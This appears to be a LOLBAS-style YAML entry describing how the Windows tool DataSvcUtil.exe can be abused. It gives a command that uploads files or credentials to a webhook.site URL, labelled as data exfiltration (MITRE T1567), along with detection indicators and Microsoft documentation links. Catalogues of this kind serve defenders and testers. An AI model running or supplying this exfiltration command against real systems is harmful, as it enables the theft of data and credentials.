---
Name: DataSvcUtil.exe
Description: DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.
Author: 'Ialle Teixeira'
Created: '01/12/2020'
Commands:
  - Command: DataSvcUtil /out:C:\\Windows\\System32\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile
    Description: Upload file, credentials or data exfiltration in general
    Usecase: Upload file
    Category: Upload
    Privileges: User
    MitreID: T1567
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe
Code_Sample:
  - Code: https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6
Detection:
  - IOC: The DataSvcUtil.exe tool is installed in the .NET Framework directory.
  - IOC: Preventing/Detecting DataSvcUtil with non-RFC1918 addresses by Network IPS/IDS.
  - IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching DataSvcUtil.
Resources:
  - Link: https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe
  - Link: https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services
  - Link: https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services
Acknowledgement:
  - Person: Ialle Teixeira
    Handle: '@NtSetDefault'
---
